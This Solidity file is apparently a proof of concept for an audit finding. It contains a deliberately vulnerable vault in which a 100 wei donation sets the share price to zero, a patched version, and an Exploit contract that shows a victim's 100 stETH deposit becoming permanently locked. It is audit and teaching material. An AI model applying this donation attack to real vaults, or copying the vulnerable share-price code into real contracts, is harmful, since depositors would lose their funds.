// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Nexus — Pashov H-06, review dated 2024-11-29.
    A 100 wei donation makes getRewards return a positive number while
    nETHMinted is still 0. _updateSharePrice stores sharePrice 0. The next
    depositor pays 100 stETH and receives 0 shares, so the stake cannot be withdrawn.
*/

contract Token {
    string public symbol = "stETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract LidoStrategy {
    struct StrategyStruct {
        uint256 valueDeposited;
        uint256 rewardsEarned;
        uint256 valueWithdrawn;
    }

    address public immutable TOKEN_ADDRESS;

    constructor(address token) {
        TOKEN_ADDRESS = token;
    }

    function getRewards(address receiver, StrategyStruct memory _strategyBalance) public view returns (uint256) {
        uint256 balance_strategy =
            _strategyBalance.valueDeposited + _strategyBalance.rewardsEarned - _strategyBalance.valueWithdrawn;
        if (IERC20Like(TOKEN_ADDRESS).balanceOf(receiver) > balance_strategy) {
            return IERC20Like(TOKEN_ADDRESS).balanceOf(receiver) - balance_strategy;
        } else {
            return 0;
        }
    }

    function send(address to, uint256 amount) external {
        require(IERC20Like(TOKEN_ADDRESS).transfer(to, amount), "send");
    }
}

contract DepositETH {
    uint256 public constant BASE_POINT = 1e18;

    LidoStrategy public strategy;
    Token public token;
    uint256 public nETHMinted;
    uint256 public sharePrice = BASE_POINT;
    uint256 public ethDeposited;
    uint256 public ethWithdrawn;
    uint256 public rewardsClaimed;
    mapping(address => uint256) public shares;

    event SharePriceUpdated(uint256 sharePrice);

    constructor(LidoStrategy _strategy, Token _token) {
        strategy = _strategy;
        token = _token;
    }

    function updateRewards() external {
        uint256 rewards = strategy.getRewards(address(strategy), LidoStrategy.StrategyStruct(ethDeposited, 0, ethWithdrawn));
        _updateSharePrice(rewards);
    }

    function _updateSharePrice(uint256 _rewardsEarned) internal {
        rewardsClaimed += _rewardsEarned;
        uint256 totalEthBalance = (ethDeposited - ethWithdrawn + rewardsClaimed);
        if (totalEthBalance == 0) {
            sharePrice = BASE_POINT;
        } else {
            // @> VULN: nETHMinted is 0, so sharePrice becomes 0 and the next deposit mints no shares
            sharePrice = (nETHMinted) * BASE_POINT / (ethDeposited - ethWithdrawn + rewardsClaimed);
        }
        emit SharePriceUpdated(sharePrice);
    }

    function deposit(uint256 _value) external {
        uint256 nETHShares = (sharePrice * _value) / BASE_POINT;
        require(token.transferFrom(msg.sender, address(strategy), _value), "pull");
        ethDeposited += _value;
        nETHMinted += nETHShares;
        shares[msg.sender] += nETHShares;
    }

    function withdraw(uint256 shareAmt) external returns (uint256 out) {
        require(shares[msg.sender] >= shareAmt && shareAmt > 0, "shares");
        require(nETHMinted > 0, "supply");
        uint256 bal = token.balanceOf(address(strategy));
        out = (shareAmt * bal) / nETHMinted;
        shares[msg.sender] -= shareAmt;
        nETHMinted -= shareAmt;
        strategy.send(msg.sender, out);
    }
}

contract DepositETHFixed {
    uint256 public constant BASE_POINT = 1e18;

    LidoStrategy public strategy;
    Token public token;
    uint256 public nETHMinted;
    uint256 public sharePrice = BASE_POINT;
    uint256 public ethDeposited;
    uint256 public ethWithdrawn;
    uint256 public rewardsClaimed;
    mapping(address => uint256) public shares;

    constructor(LidoStrategy _strategy, Token _token) {
        strategy = _strategy;
        token = _token;
    }

    function updateRewards() external {
        uint256 rewards = strategy.getRewards(address(strategy), LidoStrategy.StrategyStruct(ethDeposited, 0, ethWithdrawn));
        rewardsClaimed += rewards;
        uint256 totalEthBalance = ethDeposited - ethWithdrawn + rewardsClaimed;
        if (totalEthBalance == 0 || nETHMinted == 0) {
            sharePrice = BASE_POINT;
        } else {
            sharePrice = (nETHMinted * BASE_POINT) / totalEthBalance;
        }
    }

    function deposit(uint256 _value) external {
        uint256 nETHShares = (sharePrice * _value) / BASE_POINT;
        require(token.transferFrom(msg.sender, address(strategy), _value), "pull");
        ethDeposited += _value;
        nETHMinted += nETHShares;
        shares[msg.sender] += nETHShares;
    }

    function withdraw(uint256 shareAmt) external returns (uint256 out) {
        require(shares[msg.sender] >= shareAmt && shareAmt > 0, "shares");
        uint256 bal = token.balanceOf(address(strategy));
        out = (shareAmt * bal) / nETHMinted;
        shares[msg.sender] -= shareAmt;
        nETHMinted -= shareAmt;
        strategy.send(msg.sender, out);
    }
}

contract Victim {
    function deposit(DepositETH vault, Token token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }

    function depositFixed(DepositETHFixed vault, Token token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }

    function tryWithdraw(DepositETH vault, uint256 amount) external returns (bool) {
        try vault.withdraw(amount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function withdrawFixed(DepositETHFixed vault, uint256 amount) external returns (uint256) {
        return vault.withdraw(amount);
    }
}

contract Exploit {
    uint256 public constant DONATION = 100;
    uint256 public constant DEPOSIT = 100 ether;

    Token public token;
    LidoStrategy public strategy;
    DepositETH public vault;
    Victim public victim;
    uint256 public price;
    uint256 public victimShares;
    uint256 public stuck;
    bool public withdrawBlocked;

    constructor() {
        token = new Token();
        strategy = new LidoStrategy(address(token));
        vault = new DepositETH(strategy, token);
        victim = new Victim();
    }

    function run() external {
        token.mint(address(this), DONATION);
        token.transfer(address(strategy), DONATION);
        vault.updateRewards();
        price = vault.sharePrice();
        token.mint(address(victim), DEPOSIT);
        victim.deposit(vault, token, DEPOSIT);
        victimShares = vault.shares(address(victim));
        withdrawBlocked = !victim.tryWithdraw(vault, 1);
        stuck = token.balanceOf(address(strategy));
        require(price == 0, "price");
        require(victimShares == 0, "shares");
        require(withdrawBlocked, "withdrew");
        require(stuck == DEPOSIT + DONATION, "stuck");
    }
}
